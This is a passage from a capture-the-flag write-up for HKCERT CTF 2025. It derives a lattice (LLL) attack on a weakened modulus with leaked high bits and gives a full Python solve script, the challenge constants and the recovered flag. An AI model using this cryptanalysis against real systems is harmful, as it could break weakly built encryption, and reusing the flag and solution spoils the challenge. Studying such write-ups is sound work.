f(x_1, x_2) = x_1 x_2 + A x_1 + B x_2 + C \equiv 0 \pmod{p}</script><p>满足 $|x_1| &lt; X_1$， $|x_2| &lt; X_2$。</p>
<p>考虑多项式集合：</p>
<script type="math/tex; mode=display">
\{f(x_1,x_2),\; p,\; p x_1,\; p x_2\}</script><p>在单项式基 ${1, x_1, x_2, x_1 x_2}$ 下，加权 $(1, X_1, X_2, X_1 X_2)$ 得格基矩阵：</p>
<script type="math/tex; mode=display">
M = \begin{bmatrix}
C & A X_1 & B X_2 & X_1 X_2 \\
p & 0 & 0 & 0 \\
0 & p X_1 & 0 & 0 \\
0 & 0 & p X_2 & 0
\end{bmatrix}</script><p>对 $M$ 进行 LLL 约简，得到短向量对应整数多项式 $g_1,g_2$：</p>
<script type="math/tex; mode=display">
\begin{aligned}
g_1(x_1,x_2) &= a_0 + a_1 x_1 + a_2 x_2 + a_3 x_1 x_2 \\
g_2(x_1,x_2) &= b_0 + b_1 x_1 + b_2 x_2 + b_3 x_1 x_2
\end{aligned}</script><p>在整数上满足 $g_i(x_1,x_2)=0$。</p>
<h2 id="-2"><a href="#-2" class="headerlink" title=" "></a> </h2><p>将 $g_1,g_2$ 写成：</p>
<script type="math/tex; mode=display">
\begin{aligned}
(a_3 x_2 + a_1) x_1 + (a_2 x_2 + a_0) &= 0 \\
(b_3 x_2 + b_1) x_1 + (b_2 x_2 + b_0) &= 0
\end{aligned}</script><p>消去 $x_1$，系数行列式为零：</p>
<script type="math/tex; mode=display">
(a_3 x_2 + a_1)(b_2 x_2 + b_0) - (b_3 x_2 + b_1)(a_2 x_2 + a_0) = 0</script><p>展开得 $x_2$ 的二次方程：</p>
<script type="math/tex; mode=display">
Q_A x_2^2 + Q_B x_2 + Q_C = 0</script><p>其中：</p>
<script type="math/tex; mode=display">
\begin{aligned}
Q_A &= a_3 b_2 - b_3 a_2 \\
Q_B &= a_3 b_0 + a_1 b_2 - b_3 a_0 - b_1 a_2 \\
Q_C &= a_1 b_0 - b_1 a_0
\end{aligned}</script><h2 id="-3"><a href="#-3" class="headerlink" title=" "></a> </h2><p>解二次方程得候选 $x_2$，对每个候选 $x_2$ 回代 $g_1=0$：</p>
<script type="math/tex; mode=display">
x_1 = -\frac{a_2 x_2 + a_0}{a_3 x_2 + a_1}</script><p>筛选满足 $0 \le x_1 &lt; X_1,\; 0 \le x_2 &lt; X_2$ 的整数解。</p>
<h2 id="-4"><a href="#-4" class="headerlink" title=" "></a> </h2><p>计算：</p>
<script type="math/tex; mode=display">
\begin{aligned}
t_1 &= H_1 + x_1 \\
t_1^{-1} &\equiv t_1^{\varphi(p)-1} \pmod{p} \quad (\text{或用扩展欧几里得})
\end{aligned}</script><p>由 $t_1 \equiv k \cdot (m + r_1)^{-1} \pmod{p}$ 得：</p>
<script type="math/tex; mode=display">
m + r_1 \equiv k \cdot t_1^{-1} \pmod{p}</script><script type="math/tex; mode=display">
m \equiv (k \cdot t_1^{-1} - r_1) \bmod p</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set high precision for LLL arithmetic with large numbers</span></span><br><span class="line">getcontext().prec = <span class="number">2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Problem Data ---</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N = <span class="number">3333577291839009732612693330613476891341287017491683764014849337158389717338712200133085615150269196268856288361865352673921704626130772582853528604556994221890454520933132803888321775335519781063447756692130742361931522856942232406992357982482263472763363458621836220024977864980600979194500121897419553619426163227</span></span><br><span class="line">c = <span class="number">1277272201928931051067525742142583320131498687502905469530557519241347169899260720694873154669476372724906606385788056536109971768256973988460766527896895880291037980646963981472637862512247195798266373251524526460097881602691641026093728861572872156172787168597410496150253340538386296663073088345799201197096884740</span></span><br><span class="line">k = <span class="number">9352039867057736323</span></span><br><span class="line">r1 = <span class="number">10421792656200324147964684790160875926436411483496860422433732508593789212449544620816674407170998779863336939494663076247759140488927744939619406024905901</span></span><br><span class="line">r2 = <span class="number">8806088830734144089522276896226392806947836111998696180055727048752624989402057411311728398322297424598954586424896296000606209022432442660527640463521679</span></span><br><span class="line">leak1 = <span class="number">4266222222502644630611545246271868348722888987303187402827005454059765428769160822475080050046035916876078546634293907218937483241284454918367519709206766322037148585465519188582916280829212776096606923824120883699251868362915920299645</span></span><br><span class="line">leak2 = <span class="number">1176921186497191878459783787148403806360469809421921990427675048480656171919274113895695842508460760829511824635106692634456334400022597605585661597793889066395539405395254174368285751236344600489419240628821864912762242188289636510706</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Helper Functions ---</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse</span>(<span class="params">a, n</span>):</span><br><span class="line">    t, newt = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    r, newr = n, a</span><br><span class="line">    <span class="keyword">while</span> newr != <span class="number">0</span>:</span><br><span class="line">        quotient = r // newr</span><br><span class="line">        t, newt = newt, t - quotient * newt</span><br><span class="line">        r, newr = newr, r - quotient * newr</span><br><span class="line">    <span class="keyword">if</span> r &gt; <span class="number">1</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;a is not invertible&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> t &lt; <span class="number">0</span>: t = t + n</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gram_schmidt</span>(<span class="params">basis</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(basis)</span><br><span class="line">    mu = [[Decimal(<span class="number">0</span>)] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    B = [Decimal(<span class="number">0</span>)] * n</span><br><span class="line">    b_star = [<span class="literal">None</span>] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        vec_i = [Decimal(x) <span class="keyword">for</span> x <span class="keyword">in</span> basis[i]]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            dot = <span class="built_in">sum</span>(vec_i[k] * b_star[j][k] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vec_i)))</span><br><span class="line">            mu[i][j] = dot / B[j]</span><br><span class="line">            vec_i = [vec_i[k] - mu[i][j] * b_star[j][k] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vec_i))]</span><br><span class="line">        b_star[i] = vec_i</span><br><span class="line">        B[i] = <span class="built_in">sum</span>(x*x <span class="keyword">for</span> x <span class="keyword">in</span> vec_i)</span><br><span class="line">    <span class="keyword">return</span> mu, B</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lll_reduction</span>(<span class="params">basis, delta=Decimal(<span class="params"><span class="string">&quot;0.99&quot;</span></span>)</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(basis)</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> k &lt; n:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            mu, B = gram_schmidt(basis)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(mu[k][j]) &gt; Decimal(<span class="string">&quot;0.5&quot;</span>):</span><br><span class="line">                q = <span class="built_in">int</span>((mu[k][j]).to_integral_value(rounding=<span class="string">&#x27;ROUND_HALF_EVEN&#x27;</span>))</span><br><span class="line">                basis[k] = [basis[k][x] - q * basis[j][x] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(basis[k]))]</span><br><span class="line">        mu, B = gram_schmidt(basis)</span><br><span class="line">        <span class="keyword">if</span> B[k] &lt; (delta - mu[k][k-<span class="number">1</span>]**<span class="number">2</span>) * B[k-<span class="number">1</span>]:</span><br><span class="line">            basis[k], basis[k-<span class="number">1</span>] = basis[k-<span class="number">1</span>], basis[k]</span><br><span class="line">            k = <span class="built_in">max</span>(k - <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> basis</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Solution ---</span></span><br><span class="line"><span class="comment"># 1. Factor N (q is small, ~25 bits)</span></span><br><span class="line">q = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">2</span>**<span class="number">26</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> N % i == <span class="number">0</span>:</span><br><span class="line">        q = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = N // q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Setup Bivariate Polynomial F(x1, x2) = 0 mod p</span></span><br><span class="line">H1 = leak1 &lt;&lt; <span class="number">244</span></span><br><span class="line">H2 = leak2 &lt;&lt; <span class="number">244</span></span><br><span class="line">dr = r2 - r1</span><br><span class="line"><span class="comment"># Coefficients derived from: k(t2 - t1) + t1*t2*dr = 0 mod p</span></span><br><span class="line">C_x1x2 = dr % p</span><br><span class="line">C_x1 = (dr * H2 - k) % p</span><br><span class="line">C_x2 = (dr * H1 + k) % p</span><br><span class="line">C_1 = (k * (H2 - H1) + dr * H1 * H2) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># Normalize to make x1x2 coefficient 1</span></span><br><span class="line">inv_dr = inverse(C_x1x2, p)</span><br><span class="line">A = (C_x1 * inv_dr) % p  <span class="comment"># Coeff of x1</span></span><br><span class="line">B = (C_x2 * inv_dr) % p  <span class="comment"># Coeff of x2</span></span><br><span class="line">C = (C_1 * inv_dr) % p   <span class="comment"># Constant</span></span><br><span class="line"></span><br><span class="line">X1 = <span class="number">1</span> &lt;&lt; <span class="number">244</span></span><br><span class="line">X2 = <span class="number">1</span> &lt;&lt; <span class="number">244</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lattice Basis for F(x1, x2) = x1x2 + A*x1 + B*x2 + C</span></span><br><span class="line"><span class="comment"># Columns correspond to monomials: [1, x1, x2, x1x2]</span></span><br><span class="line"><span class="comment"># Weights: [1, X1, X2, X1*X2]</span></span><br><span class="line">basis = [</span><br><span class="line">    [C, A * X1, B * X2, X1 * X2], <span class="comment"># F</span></span><br><span class="line">    [p, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],                 <span class="comment"># p</span></span><br><span class="line">    [<span class="number">0</span>, p * X1, <span class="number">0</span>, <span class="number">0</span>],            <span class="comment"># p*x1</span></span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, p * X2, <span class="number">0</span>]             <span class="comment"># p*x2</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">reduced_basis = lll_reduction(basis)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract polynomials from short vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_coeffs</span>(<span class="params">vec</span>):</span><br><span class="line">    <span class="keyword">return</span> vec[<span class="number">0</span>], vec[<span class="number">1</span>] // X1, vec[<span class="number">2</span>] // X2, vec[<span class="number">3</span>] // (X1 * X2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use resultant of first two vectors to solve</span></span><br><span class="line">v1 = reduced_basis[<span class="number">0</span>]</span><br><span class="line">v2 = reduced_basis[<span class="number">1</span>]</span><br><span class="line">c0, c1, c2, c3 = get_coeffs(v1)</span><br><span class="line">d0, d1, d2, d3 = get_coeffs(v2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Resultant wrt x1: (c3*x2 + c1)(d2*x2 + d0) - (d3*x2 + d1)(c2*x2 + c0) = 0</span></span><br><span class="line"><span class="comment"># Quadratic in x2: QA*x2^2 + QB*x2 + QC = 0</span></span><br><span class="line">QA = c3 * d2 - d3 * c2</span><br><span class="line">QB = c3 * d0 + c1 * d2 - d3 * c0 - d1 * c2</span><br><span class="line">QC = c1 * d0 - d1 * c0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve quadratic</span></span><br><span class="line">delta_quad = QB*QB - <span class="number">4</span>*QA*QC</span><br><span class="line"><span class="keyword">if</span> delta_quad &gt;= <span class="number">0</span>:</span><br><span class="line">    isqrt_val = <span class="built_in">int</span>(Decimal(delta_quad).sqrt())</span><br><span class="line">    <span class="keyword">if</span> isqrt_val * isqrt_val == delta_quad:</span><br><span class="line">        roots = []</span><br><span class="line">        <span class="keyword">if</span> QA != <span class="number">0</span>:</span><br><span class="line">            roots.append((-QB + isqrt_val) // (<span class="number">2</span> * QA))</span><br><span class="line">            roots.append((-QB - isqrt_val) // (<span class="number">2</span> * QA))</span><br><span class="line">        <span class="keyword">elif</span> QB != <span class="number">0</span>:</span><br><span class="line">            roots.append(-QC // QB)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> rx2 <span class="keyword">in</span> roots:</span><br><span class="line">            <span class="comment"># Check x2 range</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= rx2 &lt; X2:</span><br><span class="line">                <span class="comment"># Solve for x1: x1(c3*rx2 + c1) = -(c2*rx2 + c0)</span></span><br><span class="line">                denom = c3 * rx2 + c1</span><br><span class="line">                num = - (c2 * rx2 + c0)</span><br><span class="line">                <span class="keyword">if</span> denom != <span class="number">0</span> <span class="keyword">and</span> num % denom == <span class="number">0</span>:</span><br><span class="line">                    rx1 = num // denom</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0</span> &lt;= rx1 &lt; X1:</span><br><span class="line">                        <span class="comment"># Recover m</span></span><br><span class="line">                        t1 = (H1 + rx1) % p</span><br><span class="line">                        m = (k * inverse(t1, p) - r1) % p</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            flag = m.to_bytes((m.bit_length()+<span class="number">7</span>)//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(flag.decode())</span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>flag{H4hAHhhHh4_c0pP3r_N07_v1OI3n7_3n0uGh}</strong></p>
<script type="math/tex; mode=display">
\begin{aligned}
q &= ????????,\quad p = \frac{N}{q},\quad H_1 = \text{leak}_1 \cdot 2^{244},\quad H_2 = \text{leak}_2 \cdot 2^{244},\\
x_1 &= t_1 \bmod 2^{244},\; 0 \le x_1 < 2^{244},\quad x_2 = t_2 \bmod 2^{244},\; 0 \le x_2 < 2^{244},\\
T_1 &= H_1 + x_1,\quad T_2 = H_2 + x_2,\\
(r_1 - r_2) &\equiv k(t_1^{-1} - t_2^{-1}) \pmod{p} \equiv k \cdot \frac{t_2 - t_1}{t_1 t_2} \pmod{p},\\
k(t_2 - t_1) &- (r_1 - r_2)t_1 t_2 \equiv 0 \pmod{p},\\
d_r &= r_2 - r_1,\quad k(T_2 - T_1) - d_r T_1 T_2 \equiv 0 \pmod{p} \quad (1),\\
k(H_2 &+ x_2 - H_1 - x_1) - d_r(H_1 + x_1)(H_2 + x_2) \equiv 0 \pmod{p},\\
k(H_2 - H_1) &+ kx_2 - kx_1 - d_r H_1 H_2 - d_r H_1 x_2 - d_r H_2 x_1 - d_r x_1 x_2 \equiv 0 \pmod{p},\\
(-d_r H_2 &- k)x_1 + (-d_r H_1 + k)x_2 - d_r x_1 x_2 + [k(H_2 - H_1) - d_r H_1 H_2] \equiv 0 \pmod{p},\\
C_{x_1x_2} &= -d_r,\; C_{x_1} = -d_r H_2 - k,\; C_{x_2} = -d_r H_1 + k,\; C_1 = k(H_2 - H_1) - d_r H_1 H_2,\\
C_{x_1x_2} &x_1 x_2 + C_{x_1} x_1 + C_{x_2} x_2 + C_1 \equiv 0 \pmod{p} \quad (2),\\
d &= C_{x_1x_2}^{-1} \bmod p,\quad x_1 x_2 + A x_1 + B x_2 + C \equiv 0 \pmod{p},\\
A &= C_{x_1} \cdot d \bmod p,\; B = C_{x_2} \cdot d \bmod p,\; C = C_1 \cdot d \bmod p,\\
X_1 &= X_2 = 2^{244},\quad f(x_1, x_2) = x_1 x_2 + A x_1 + B x_2 + C \equiv 0 \pmod{p},\\
M &= \begin{bmatrix}
C & A X_1 & B X_2 & X_1 X_2 \\
p & 0 & 0 & 0 \\
0 & p X_1 & 0 & 0 \\
0 & 0 & p X_2 & 0
\end{bmatrix},\\
g_1(x_1,x_2) &= a_0 + a_1 x_1 + a_2 x_2 + a_3 x_1 x_2,\quad g_2(x_1,x_2) = b_0 + b_1 x_1 + b_2 x_2 + b_3 x_1 x_2,\\
(a_3 x_2 + a_1) &x_1 + (a_2 x_2 + a_0) = 0,\quad (b_3 x_2 + b_1) x_1 + (b_2 x_2 + b_0) = 0,\\
(a_3 x_2 + a_1)&(b_2 x_2 + b_0) - (b_3 x_2 + b_1)(a_2 x_2 + a_0) = 0,\\
Q_A x_2^2 &+ Q_B x_2 + Q_C = 0,\quad Q_A = a_3 b_2 - b_3 a_2,\\
Q_B &= a_3 b_0 + a_1 b_2 - b_3 a_0 - b_1 a_2,\quad Q_C = a_1 b_0 - b_1 a_0,\\
x_1 &= -\frac{a_2 x_2 + a_0}{a_3 x_2 + a_1},\quad 0 \le x_1 < X_1,\; 0 \le x_2 < X_2,\\
t_1 &= H_1 + x_1,\quad t_1^{-1} \equiv t_1^{\varphi(p)-1} \pmod{p},\\
m + r_1 &\equiv k \cdot t_1^{-1} \pmod{p},\quad m \equiv (k \cdot t_1^{-1} - r_1) \bmod p.
\end{aligned}</script>
    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>Rekjo
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="http://example.com/2025/12/31/HKCERT-CTF2025/" title="HKCERT_CTF2025">http://example.com/2025/12/31/HKCERT-CTF2025/</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>


        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/12/23/CBCTF2025-wp/" rel="prev" title="CBCTF2025_wp">
                  <i class="fa fa-angle-left"></i> CBCTF2025_wp
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder"><span id="copyright"> Welcome. All rights reserved. Non-commercial use allowed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a>.</span></span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div><div>
<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        // 关键修复：将日期格式改为 ISO 8601 (年-月-日)
        var grt = new Date("2025-12-22 00:00:00");
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
    setInterval("createtime()",250);
</script>
</div>


    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
